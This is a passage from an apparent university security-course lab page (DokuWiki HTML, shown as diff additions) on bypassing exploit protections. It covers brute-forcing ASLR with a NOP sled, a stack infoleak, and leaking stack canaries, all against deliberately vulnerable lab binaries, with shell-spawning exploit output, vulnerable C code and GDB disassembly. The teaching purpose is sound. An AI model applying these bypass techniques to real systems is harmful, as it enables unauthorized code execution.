+</p>
+<pre class="code">$ python exploit-t2.py
+[+] Starting local process &#039;./vulnerable&#039;: Done
+[*] Switching to interactive mode
+$ ls /
+bin   home          lib32      media  root  sys  vmlinuz
+boot  initrd.img      lib64      mnt     run   tmp  vmlinuz.old
+dev   initrd.img.old  libx32      opt     sbin  usr
+etc   lib          lost+found  proc     srv   var
+$ </pre>
+
+<p>
+<p><div class="notetip">
+In the PRECIS 706 lab room it may happen that the address you found through GDB (something like <code>0xffffd07c</code>) will not work. You can use a value more similar to the one we provide from our investigation (<code>0xffffdbc8</code>).
+
+</div></p>
+</p>
+
+</div>
+
+<h2 class="sectionedit11" id="tasks">Tasks</h2>
+<div class="level2">
+
+</div>
+
+<h3 class="sectionedit12" id="brute-force_aslr_bypass_3p">1. Brute-force ASLR bypass [3p]</h3>
+<div class="level3">
+
+<p>
+First, make sure ASLR is enabled:
+</p>
+<pre class="code">$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+2</pre>
+
+<p>
+<strong>The task</strong> is to upgrade the exploitation script to <strong>brute-force ASLR</strong>. Take a look at the tips below if you get stuck.
+</p>
+
+<p>
+<p><div class="notetip">
+Bypassing ASLR through brute-force is possible only because <code>vulnerable</code> is a 32-bit binary, although this technique is technically speaking possible on 64-bit if the attacker can leak <em>address bits</em>. The key question to ask here is, <strong>how many bits of entropy</strong> does ASLR yield on our architecture?
+</p>
+
+<p>
+We can find the answer quickly through empirical means. We&#039;ve included a program called <code>buf.c</code> in the <a href="http://elf.cs.pub.ro/oss/res/labs/lab-08.tar.gz" class="urlextern" title="http://elf.cs.pub.ro/oss/res/labs/lab-08.tar.gz"  rel="nofollow">lab archive</a>, which intentionally leaks a stack address. Let&#039;s compile it and give it a few runs:
+</p>
+<pre class="code">$ make buf
+...
+$ for i in $(seq 1 20); do ./buf; done
+0xff98382c
+0xffa79b0c
+0xfffc01bc
+0xfff26d5c
+0xffaa8cfc
+0xffa6c58c
+0xffb05dec
+0xff8578bc
+0xff84554c
+0xffa9d39c
+0xffb61d5c
+0xffb76cfc
+0xffb5363c
+0xff9c4edc
+0xffc8a29c
+0xffa956dc
+0xffe8d0cc
+0xff9b024c
+0xffc2b93c
+0xffa579cc</pre>
+
+<p>
+Looking at the addresses below (btw, remember the memory dump analysis task from <a href="lab-03.html" class="wikilink1" title="cns:labs:lab-03">Lab 03</a>?), we can see that the <em>most significant byte</em> is always <code>0xff</code>, while  the <em>least significant nibble</em> (4-bit value) is always <code>0xc</code>. This means 12 address bits are fixed, which leaves us with <code>32 - 12 = 20</code> address bits.
+</p>
+
+<p>
+So filling the stack with a payload which is <code>2^20 = 1MB</code> in size should in theory guarantee us that our attack is reliable. In practice this is not so easy, because the total size of the environment variables is limited by <code>ARG_MAX</code> (also see the “Limits on size of arguments and environment” section in the <a href="http://man7.org/linux/man-pages/man2/execve.2.html" class="urlextern" title="http://man7.org/linux/man-pages/man2/execve.2.html"  rel="nofollow">execve manpage</a>):
+</p>
+<pre class="code">$ getconf ARG_MAX
+2097152</pre>
+
+<p>
+So we have about 2MB for <em>all the arguments and environment variables</em>, which doesn&#039;t give us a fully reliable attack surface, but it easily provides trial-end-error potential.
+</p>
+
+<p>
+We recommend you use something around <code>100000</code> bytes (a.k.a <code>100k</code> bytes) for the NOP sled. A Python construct such as
+</p>
+<pre class="code">nopsled = &quot;\x90&quot; * 100000</pre>
+
+<p>
+
+</div></p>
+</p>
+
+<p>
+<p><div class="notetip">
+Note that simply increasing the NOP sled size isn&#039;t enough. You still need to randomize the target return address using <a href="https://docs.python.org/2/library/random.html" class="urlextern" title="https://docs.python.org/2/library/random.html"  rel="nofollow">Python&#039;s random</a>. The target format is exactly the one explained in the previous tip: <code>ff</code> + 20 random bits + <code>8</code> (although the least significant nibble could be any multiple of 4 in principle).
+
+</div></p>
+</p>
+
+<p>
+<p><div class="notetip">
+Some Python tips:
+</p>
+<ul>
+<li class="level1"><div class="li"> You can simply run the payload injection and random generation in a <code>while True</code> loop</div>
+</li>
+<li class="level1"><div class="li"> The process will simply return an <code><abbr title="End of file">EOF</abbr></code> when it <code>SIGSEGV</code>s. You can do a timed-out <code>recv</code> (see <a href="http://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recv" class="urlextern" title="http://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.recv"  rel="nofollow">pwntools&#039; processes</a>) in a <a href="https://docs.python.org/2.7/tutorial/errors.html#handling-exceptions" class="urlextern" title="https://docs.python.org/2.7/tutorial/errors.html#handling-exceptions"  rel="nofollow">&#039;&#039;try/except&#039;&#039; block</a> that only launches the interactive shell when we know the child process hasn&#039;t closed its end of the pipe.</div>
+</li>
+<li class="level1"><div class="li"> When an <code><abbr title="End of file">EOF</abbr></code> occurs, make sure to terminate the process/tube and close its descriptors in order to free resources. Use<pre class="code">io.terminate()
+io.wait()
+io.close()</pre>
+</div>
+</li>
+</ul>
+
+<p>
+
+</div></p>
+</p>
+
+<p>
+<p><div class="notetip">
+While running the exploit script (using <code>pwntools</code>) you may end up getting a shell prompt, typing <code>ls</code> or some other command and nothing happening. That&#039;s because <code>pwntools</code> didn&#039;t timeout when doing a receive and served you a prompt; but it didn&#039;t actually reached the shellcode. So let it run until it reaches the shellcode and a shell will get spawned and all your command (such as <code>ls</code>) will work.
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit13" id="stackbleedinfoleak_aslr_bypass_4p">2. Stackbleed: infoleak + ASLR bypass [4p]</h3>
+<div class="level3">
+
+<p>
+Examine <code>vulnerable2.c</code>. This is very similar to <code>vulnerable</code>, only <code>get_user_input</code> calls <code>read</code> twice:
+</p>
+<pre class="code C"><span class="kw4">void</span> get_user_input<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
+<span class="br0">&#123;</span>
+	<span class="kw4">char</span> <span class="sy0">*</span>env <span class="sy0">=</span> <a href="http://www.opengroup.org/onlinepubs/009695399/functions/getenv.html"><span class="kw3">getenv</span></a><span class="br0">&#40;</span><span class="st0">&quot;SHELLCODE&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
+	<span class="kw4">char</span> buf<span class="br0">&#91;</span>BUFFER_SIZE<span class="br0">&#93;</span><span class="sy0">;</span>
+&nbsp;
+	read<span class="br0">&#40;</span>STDIN_FILENO<span class="sy0">,</span> buf<span class="sy0">,</span> BUFFER_SIZE<span class="br0">&#41;</span><span class="sy0">;</span>
+	<a href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span class="kw3">printf</span></a><span class="br0">&#40;</span><span class="st0">&quot;%s<span class="es1">\n</span>&quot;</span><span class="sy0">,</span> buf<span class="br0">&#41;</span><span class="sy0">;</span>
+&nbsp;
+	read<span class="br0">&#40;</span>STDIN_FILENO<span class="sy0">,</span> buf<span class="sy0">,</span> <span class="nu0">12</span><span class="sy0">*</span>BUFFER_SIZE<span class="br0">&#41;</span><span class="sy0">;</span>
+<span class="br0">&#125;</span></pre>
+
+<p>
+The first <code>read</code> is seemingly correct, only it has one big problem: it doesn&#039;t set the string NULL terminator, so the <code>printf</code> right after it can easily leak <code>env</code>. Let&#039;s give it a try:
+</p>
+<pre class="code">$ python -c &#039;import sys; sys.stdout.write(&quot;ABCD&quot;)&#039; | SHELLCODE=&quot;\x90\x90\x90\x90&quot; ./vulnerable2 | xxd
+00000000: 4142 4344 d90f d3ff 010a                 ABCD......</pre>
+
+<p>
+We can safely assume that the bytes <code>d90fd3ff</code> are in fact the value in <code>env</code> (<code>0xffd30fd9</code>).
+</p>
+
+<p>
+<strong>The task</strong>: using the infrastructure from the tutorial and the previous tasks, build an automated exploit that uses this infoleak to jump to the address of <code>SHELLCODE</code>.
+</p>
+
+<p>
+<p><div class="notetip">
+Since the attacker needs to be precise about how many characters they write in the first phase, they are better served by <code>send</code>, instead of <code>sendline</code>. Consult the <a href="http://docs.pwntools.com/en/stable/tubes.html" class="urlextern" title="http://docs.pwntools.com/en/stable/tubes.html"  rel="nofollow">pwnlib tubes</a> documentation for more details.
+
+</div></p>
+</p>
+
+<p>
+<p><div class="notetip">
+When computing the offset from the start of <code>buf</code> to the return address please note that the first <code>read()</code> call reads <code>4</code> bytes and then the second <code>read()</code> call reads again starting from <code>buf</code>.
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit14" id="extrainfoleak_stack_canary_bypass_2p">3. Extra: infoleak + stack canary bypass [2p]</h3>
+<div class="level3">
+
+<p>
+Examine <code>vulnerable3.c</code> and the resulting <code>vulnerable3</code> executable file. It is once again very similar to the previous incarnations, but we will use it for something somewhat different: leaking the stack canary and bypassing it.
+</p>
+
+<p>
+Knowing that <code>buf</code>&#039;s size is 4, we want to determine exactly where the canary value starts. For now, let&#039;s take a look at <code>vulnerable3</code> with GDB:
+</p>
+<pre class="code asm"><span class="sy2">$</span> gdb <span class="sy1">-</span>q <span class="sy1">./</span>vulnerable3
+Reading symbols from <span class="sy1">./</span>vulnerable3<span class="sy1">...</span>done<span class="sy1">.</span>
+gdb<span class="sy1">-</span>peda<span class="sy2">$</span> pdis get_user_input
+Dump of assembler <span class="kw5">code</span> for function get_user_input<span class="sy1">:</span>
+   <span class="nu0">0x0804848b</span> &lt;<span class="sy1">+</span><span class="nu0">0</span>&gt;<span class="sy1">:</span>	<span class="kw1">push</span>   <span class="kw4">ebp</span>
+   <span class="nu0">0x0804848c</span> &lt;<span class="sy1">+</span><span class="nu0">1</span>&gt;<span class="sy1">:</span>	<span class="kw1">mov</span>    <span class="kw4">ebp</span><span class="sy1">,</span><span class="kw4">esp</span>
+   <span class="nu0">0x0804848e</span> &lt;<span class="sy1">+</span><span class="nu0">3</span>&gt;<span class="sy1">:</span>	<span class="kw1">sub</span>    <span class="kw4">esp</span><span class="sy1">,</span><span class="nu0">0x18</span>
+   <span class="nu0">0x08048491</span> &lt;<span class="sy1">+</span><span class="nu0">6</span>&gt;<span class="sy1">:</span>	<span class="kw1">mov</span>    <span class="kw4">eax</span><span class="sy1">,</span><span class="kw4">gs</span><span class="sy1">:</span><span class="nu0">0x14</span>
+   <span class="nu0">0x08048497</span> &lt;<span class="sy1">+</span><span class="nu0">12</span>&gt;<span class="sy1">:</span>	<span class="kw1">mov</span>    <span class="kw6">DWORD</span> PTR <span class="br0">&#91;</span><span class="kw4">ebp</span><span class="sy1">-</span><span class="nu0">0xc</span><span class="br0">&#93;</span><span class="sy1">,</span><span class="kw4">eax</span>
+<span class="sy1">...</span>
+   <span class="nu0">0x080484c9</span> &lt;<span class="sy1">+</span><span class="nu0">62</span>&gt;<span class="sy1">:</span>	<span class="kw1">call</span>   <span class="nu0">0x8048340</span> &lt;read@plt&gt;
+   <span class="nu0">0x080484ce</span> &lt;<span class="sy1">+</span><span class="nu0">67</span>&gt;<span class="sy1">:</span>	<span class="kw1">add</span>    <span class="kw4">esp</span><span class="sy1">,</span><span class="nu0">0x10</span>
+   <span class="nu0">0x080484d1</span> &lt;<span class="sy1">+</span><span class="nu0">70</span>&gt;<span class="sy1">:</span>	<span class="kw1">nop</span>
+   <span class="nu0">0x080484d2</span> &lt;<span class="sy1">+</span><span class="nu0">71</span>&gt;<span class="sy1">:</span>	<span class="kw1">mov</span>    <span class="kw4">eax</span><span class="sy1">,</span><span class="kw6">DWORD</span> PTR <span class="br0">&#91;</span><span class="kw4">ebp</span><span class="sy1">-</span><span class="nu0">0xc</span><span class="br0">&#93;</span>
+   <span class="nu0">0x080484d5</span> &lt;<span class="sy1">+</span><span class="nu0">74</span>&gt;<span class="sy1">:</span>	<span class="kw1">xor</span>    <span class="kw4">eax</span><span class="sy1">,</span><span class="kw6">DWORD</span> PTR <span class="kw4">gs</span><span class="sy1">:</span><span class="nu0">0x14</span>
+   <span class="nu0">0x080484dc</span> &lt;<span class="sy1">+</span><span class="nu0">81</span>&gt;<span class="sy1">:</span>	<span class="kw1">je</span>     <span class="nu0">0x80484e3</span> &lt;get_user_input<span class="sy1">+</span><span class="nu0">88</span>&gt;
+   <span class="nu0">0x080484de</span> &lt;<span class="sy1">+</span><span class="nu0">83</span>&gt;<span class="sy1">:</span>	<span class="kw1">call</span>   <span class="nu0">0x8048350</span> &lt;__stack_chk_fail@plt&gt;
+   <span class="nu0">0x080484e3</span> &lt;<span class="sy1">+</span><span class="nu0">88</span>&gt;<span class="sy1">:</span>	<span class="kw1">leave</span>  
+   <span class="nu0">0x080484e4</span> &lt;<span class="sy1">+</span><span class="nu0">89</span>&gt;<span class="sy1">:</span>	<span class="kw1">ret</span>    
+End of assembler dump<span class="sy1">.</span></pre>
+
+<p>
+Looking at the prologue and epilogue, we see that the following operations are included:
+</p>
+<ul>
+<li class="level1"><div class="li"> A move into <code>eax</code> (and then on the stack) of a value coming from <code>gs:0x14</code>.</div>
+</li>
+<li class="level1"><div class="li"> The comparison of the value on the stack with the reference in <code>gs:0x14</code>.</div>
+</li>
+</ul>
+
+<p>
+Let&#039;s take a look at that value by breakpointing at the instruction right after the <code>eax</code> assignment:
+</p>
+<pre class="code">gdb-peda$ b *0x08048497
+Breakpoint 1 at 0x8048497: file vulnerable3.c, line 8.
+gdb-peda$ r &lt; &lt;(echo -n &quot;AAAA\n&quot;)
+...
+gdb-peda$ print $eax
+$1 = 0xe27b7000</pre>
+
+<p>
+The canary value is <code>0xe27b7000</code> but it will differ at each run. One observation is that the canary value will almost always start with a least-significant <code>NUL</code> byte (i.e. <code>&#039;\0&#039;</code>). This is actually meant to protect against <code>printf</code>-based information leaks, so let&#039;s experiment a bit:
+</p>
+<pre class="code">$ # we give &quot;ABCD&quot; as an input
+$ python -c &#039;import sys; sys.stdout.write(&quot;ABCD&quot;)&#039; | ./vulnerable3 | xxd
+00000000: 4142 4344 0a                             ABCD.
+$ # we give &quot;ABCD\n&quot; as an input
+$ python -c &#039;import sys; sys.stdout.write(&quot;ABCD\n&quot;)&#039; | ./vulnerable3 | xxd
+*** stack smashing detected ***: ./vulnerable3 terminated
+...
+00000000: 4142 4344 0a7e 3d76 010a                 ABCD.~=v..</pre>
+
+<p>
+In the first run we sent 4 bytes as input, but were unable to leak the canary value address since it start with a <code>NUL</code> byte and the <code>printf</code> call stops there. In the second run we&#039;ve overwritten the <code>NUL</code> byte with the newline character (<code>\n</code>, <code>0xa</code>).
+</p>
+
+<p>
+<strong>Your task</strong> is to inject an input that leaks the canary value, then, in the second read overwrite the value and trigger a <code>SIGSEGV</code> at <code>0x45454545</code>.
+</p>
+
+<p>
+<p><div class="noteclassic">
+The “least-significant <code>NUL</code>-byte” rule is more of an assumption we&#039;re making than an actual principle. Sometimes the randomly-chosen canary values may also contain <code>NUL</code> bytes in other positions, in which case our approach won&#039;t work too well. Still, any extra byte that we guess is a step towards a bypass.
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit15" id="extrainfoleak_stack_canary_aslr_bypass_2p">4. Extra: infoleak + stack canary + ASLR bypass [2p]</h3>
+<div class="level3">
+
+<p>
+Now that you&#039;ve learned about bypassing ASLR (through brute force) and bypassing stack canary through information leak, combine the exploit from <a href="lab-08.html#brute-force_aslr_bypass_3p" title="cns:labs:lab-08 ↵" class="wikilink1">Task 1: Brute-force ASLR bypass</a> with the one from <a href="lab-08.html#extrainfoleak_stack_canary_bypass_2p" title="cns:labs:lab-08 ↵" class="wikilink1">Task 3: infoleak + stack canary bypass</a> and exploit <code>vulnerable3</code> to get a shell.
+</p>
+
+<p>
+<p><div class="notetip">
+You will use the random generation and loop for starting a process tube from <a href="lab-08.html#brute-force_aslr_bypass_3p" title="cns:labs:lab-08 ↵" class="wikilink1">Task 1: Brute-force ASLR bypass</a> with the information leak and payload crafting from <a href="lab-08.html#extrainfoleak_stack_canary_bypass_2p" title="cns:labs:lab-08 ↵" class="wikilink1">Task 3: infoleak + stack canary bypass</a>.
+
+</div></p>
+</p>
+
+</div>
+<div class="footnotes">
+<div class="fn"><sup><a href="lab-08.html#fnt__1" id="fn__1" class="fn_bot">1)</a></sup> 
+We can decode the error code using information in the <a href="http://lxr.free-electrons.com/source/arch/x86/mm/fault.c#L30" class="urlextern" title="http://lxr.free-electrons.com/source/arch/x86/mm/fault.c#L30"  rel="nofollow">Linux kernel source code</a>. Error code <code>6</code> corresponds to a failed user space write operation, but that doesn&#039;t help much.</div>
+</div>
+
+        </div>
+        <div class="right_sidebar">
+          <form action="../../start.html" accept-charset="utf-8" class="search" id="dw__search" method="get"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="Search" class="button" title="Search" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>          <div class="namespace_sidebar sidebar_box">
+
+<div><div id="nojs_indexmenu_168613940558355b7b156c5" data-jsajax="%26skipfile%3D%252B/cns%253A%2528sidebar%257Cindex%2529/" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../calendar.html" class="wikilink1" title="cns:calendar">Calendar</a></div></li>
+<li class="level1"><div class="li"><a href="../class-register.html" class="wikilink1" title="cns:class-register">Class Register</a></div></li>
+<li class="level1"><div class="li"><a href="../lab-split.html" class="wikilink1" title="cns:lab-split">Lab Split</a></div></li>
+<li class="level1"><div class="li"><a href="../need-to-know.html" class="wikilink1" title="cns:need-to-know">CNS Need to Know</a></div></li>
+<li class="level1"><div class="li"><a href="../news.html" class="wikilink1" title="cns:news">News</a></div></li>
+<li class="level1"><div class="li"><a href="../rules-and-grading.html" class="wikilink1" title="cns:rules-and-grading">Rules and Grading</a></div></li>
+</ul>
+</div></div>
+
+<h1 class="sectionedit1" id="resources">Resources</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_205187616958355b7b185a3" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../resources/direct.html" class="wikilink1" title="cns:resources:direct">Direct Access</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/documentation.html" class="wikilink1" title="cns:resources:documentation">Documentation</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/feed.html" class="wikilink1" title="cns:resources:feed">RSS Feed</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/mailing-list.html" class="wikilink1" title="cns:resources:mailing-list">Mailing List</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/vm.html" class="wikilink1" title="cns:resources:vm">Virtual Machine</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT1 SECTION "Resources" [104-160] -->
+<h1 class="sectionedit2" id="labs">Labs</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_185647177958355b7b1a4e3" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="lab-01.html" class="wikilink1" title="cns:labs:lab-01">Lab 01 - Introduction. Basic Exploration Tools</a></div></li>
+<li class="level1"><div class="li"><a href="lab-02.html" class="wikilink1" title="cns:labs:lab-02">Lab 02 - Assembly Language</a></div></li>
+<li class="level1"><div class="li"><a href="lab-03.html" class="wikilink1" title="cns:labs:lab-03">Lab 03 - Executables. Static Analysis</a></div></li>
+<li class="level1"><div class="li"><a href="lab-04.html" class="wikilink1" title="cns:labs:lab-04">Lab 04 - Processes. Dynamic Analysis</a></div></li>
+<li class="level1"><div class="li"><a href="lab-05.html" class="wikilink1" title="cns:labs:lab-05">Lab 05 - The Stack. Buffer Management</a></div></li>
+<li class="level1"><div class="li"><a href="lab-06.html" class="wikilink1" title="cns:labs:lab-06">Lab 06 - Exploiting. Shellcodes</a></div></li>
+<li class="level1"><div class="li"><a href="lab-07.html" class="wikilink1" title="cns:labs:lab-07">Lab 07 - Exploiting. Shellcodes (Part 2)</a></div></li>
+<li class="level1"><div class="li"><span class="curid"><a href="lab-08.html" class="wikilink1" title="cns:labs:lab-08">Lab 08 - Exploit Protection Mechanisms</a></span></div></li>
+<li class="level1"><div class="li"><a href="lab-09.html" class="wikilink1" title="cns:labs:lab-09">Lab 09 - Encryption. Hashing. APIs</a></div></li>
+<li class="level1"><div class="li"><a href="lab-10.html" class="wikilink1" title="cns:labs:lab-10">Lab 10 - Password Breaking</a></div></li>
+<li class="level1"><div class="li"><a href="lab-11.html" class="wikilink1" title="cns:labs:lab-11">Lab 11 - Web Application Security (part 1)</a></div></li>
+<li class="level1"><div class="li"><a href="lab-12.html" class="wikilink1" title="cns:labs:lab-12">Lab 12 - Web Application Security (part 2)</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT2 SECTION "Labs" [161-207] -->
+<h1 class="sectionedit3" id="lectures">Lectures</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_48972871758355b7b1c423" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../lectures/lecture-01.html" class="wikilink1" title="cns:lectures:lecture-01">Lecture 01 - Introduction. Basic Exploration Tools</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-02.html" class="wikilink1" title="cns:lectures:lecture-02">Lecture 02 - Assembly Language</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-03.html" class="wikilink1" title="cns:lectures:lecture-03">Lecture 03 - Executables. Static Analysis</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-04.html" class="wikilink1" title="cns:lectures:lecture-04">Lecture 04 - Processes. Dynamic Analysis. GDB</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-05.html" class="wikilink1" title="cns:lectures:lecture-05">Lecture 05 - The Stack. Buffer Management</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-06.html" class="wikilink1" title="cns:lectures:lecture-06">Lecture 06 - Exploiting. Shellcodes</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-07.html" class="wikilink1" title="cns:lectures:lecture-07">Lecture 07 - Strings</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-08.html" class="wikilink1" title="cns:lectures:lecture-08">Lecture 08 - Integers</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-09.html" class="wikilink1" title="cns:lectures:lecture-09">Lecture 09 - Encryption. Hashing. APIs</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-10.html" class="wikilink1" title="cns:lectures:lecture-10">Lecture 10 - Password Cracking</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-11.html" class="wikilink1" title="cns:lectures:lecture-11">Lecture 11 - Web Application Security (part 1)</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-12.html" class="wikilink1" title="cns:lectures:lecture-12">Lecture 12 - Web Application Security (part 2)</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT3 SECTION "Lectures" [208-262] -->
+<h1 class="sectionedit4" id="assignments">Assignments</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_114956272958355b7b1e364" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../assignments/assignment-1.html" class="wikilink1" title="cns:assignments:assignment-1">Assignment 1</a></div></li>
+<li class="level1"><div class="li"><a href="../assignments/assignment-2.html" class="wikilink1" title="cns:assignments:assignment-2">Assignment 2</a></div></li>
+<li class="level1"><div class="li"><a href="../assignments/assignment-3.html" class="wikilink1" title="cns:assignments:assignment-3">Assignment 3</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT4 SECTION "Assignments" [263-] -->
+</div>
+<div class="toc_sidebar sidebar_box">
+<!-- TOC START -->
+<div id="sb__right__dw__toc">
+<h3 class="toggle">Table of Contents</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="lab-08.html#lab_08_-_exploit_protection_mechanisms">Lab 08 - Exploit Protection Mechanisms</a></div>
+<ul class="toc">
+<li class="level2"><div class="li"><a href="lab-08.html#resources">Resources</a></div></li>
+<li class="level2"><div class="li"><a href="lab-08.html#lab_support_files">Lab Support Files</a></div></li>
+<li class="level2"><div class="li"><a href="lab-08.html#introductionprotection_mechanisms">Introduction: Protection Mechanisms</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-08.html#code_integrity_protection">Code Integrity Protection</a></div></li>
+<li class="level3"><div class="li"><a href="lab-08.html#address_space_layout_randomization">Address Space Layout Randomization</a></div></li>
+<li class="level3"><div class="li"><a href="lab-08.html#stack_protectioncanaries">Stack Protection: Canaries</a></div></li>
+</ul>
+</li>
+<li class="level2"><div class="li"><a href="lab-08.html#tutorials">Tutorials</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-08.html#t1_gcc_stack_protector_1p">T1. GCC stack protector [1p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-08.html#t2_recapinjecting_the_shellcode_using_environment_variables_2p">T2. Recap: injecting the shellcode using environment variables [2p]</a></div></li>
+</ul>
+</li>
+<li class="level2"><div class="li"><a href="lab-08.html#tasks">Tasks</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-08.html#brute-force_aslr_bypass_3p">1. Brute-force ASLR bypass [3p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-08.html#stackbleedinfoleak_aslr_bypass_4p">2. Stackbleed: infoleak + ASLR bypass [4p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-08.html#extrainfoleak_stack_canary_bypass_2p">3. Extra: infoleak + stack canary bypass [2p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-08.html#extrainfoleak_stack_canary_aslr_bypass_2p">4. Extra: infoleak + stack canary + ASLR bypass [2p]</a></div></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+</div>
+        </div>
+      
+    
+      <div class="stylefoot">
+        <div class="meta">
+          <div class="user">
+                    </div>
+          <div class="doc">
+          cns/labs/lab-08.txt · Last modified: 2016/11/22 21:14 by razvan.deaconescu          </div>
+        </div>
+      </div>
+
+    <div class="clearer"></div>
+
+    
+                <div class="bar" id="bar__bottom">
+      <div class="bar-left">
+              </div>
+      <div class="bar-right">
+        <a href="http://ocw.cs.pub.ro/courses/cns/labs/lab-08?do=media&amp;ns=cns%3Alabs"  class="action media" rel="nofollow" title="Media Manager">Media Manager</a><a href="lab-08.html#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="Back to top [T]">Back to top</a>      </div>
+    </div>
+    <div class="clearer"></div>
+            
+    <div align="center" class="footerinc">
+  <div class="license"><a href="http://creativecommons.org/licenses/by-sa/3.0/" rel="license"><img src="../../lib/images/license/button/cc-by-sa.png" alt="CC Attribution-Share Alike 3.0 Unported" /></a></div>
+  <a target="_blank" href="http://www.chimeric.de" title="www.chimeric.de"><img src="../../lib/tpl/arctic/images/button-chimeric-de.png" width="80" height="15" alt="www.chimeric.de" border="0" /></a>
+
+  <a target="_blank" href="http://jigsaw.w3.org/css-validator/check/referer" title="Valid CSS"><img src="../../lib/tpl/arctic/images/button-css.png" width="80" height="15" alt="Valid CSS" border="0" /></a>
+
+  <a target="_blank" href="http://wiki.splitbrain.org/wiki:dokuwiki" title="Driven by DokuWiki"><img src="../../lib/tpl/arctic/images/button-dw.png" width="80" height="15" alt="Driven by DokuWiki" border="0" /></a>
+
+  <a target="_blank" href="http://www.firefox-browser.de" title="do yourself a favour and use a real browser - get firefox"><img src="../../lib/tpl/arctic/images/button-firefox.png" width="80" height="15" alt="do yourself a favour and use a real browser - get firefox!!" border="0" /></a>
+  
+  <a target="_blank" href="../../feed.php" title="Recent changes RSS feed"><img src="../../lib/tpl/arctic/images/button-rss.png" width="80" height="15" alt="Recent changes RSS feed" border="0" /></a>
+
+  <a target="_blank" href="http://validator.w3.org/check/referer" title="Valid XHTML 1.0"><img src="../../lib/tpl/arctic/images/button-xhtml.png" width="80" height="15" alt="Valid XHTML 1.0" border="0" /></a>
+</div>
+
+  </div>
+</div>
+
+<div class="no"><img src="http://ocw.cs.pub.ro/courses/lib/exe/indexer.php?id=cns%3Alabs%3Alab-08&amp;1479891835" width="2" height="1" alt="" /></div>
+</body>
+</html>
